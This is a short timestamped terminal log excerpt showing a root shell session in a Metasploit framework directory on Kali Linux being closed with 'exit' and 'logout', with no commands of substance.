2018-04-15T18:24:30.077 - root@kali:/opt/metasploit-framework# 
2018-04-15T18:24:30.311 - root@kali:/opt/metasploit-framework# 
2018-04-15T18:24:32.556 - root@kali:/opt/metasploit-framework# exit
2018-04-15T18:24:32.556 - logout
2018-04-15T18:24:32.631 - 
```